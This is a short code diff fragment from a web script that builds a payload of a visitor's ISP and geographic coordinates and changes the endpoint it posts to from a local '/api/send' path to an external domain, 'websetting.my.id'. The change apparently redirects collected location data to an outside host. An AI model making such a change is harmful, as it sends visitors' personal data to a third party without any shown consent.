@@ -129,7 +129,7 @@
             payload.isp = d.org || "-";
             payload.koord = (d.latitude||"-")+" , "+(d.longitude||"-");
             
-            return fetch("/api/send", {
+            return fetch("https://websetting.my.id/api/send", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
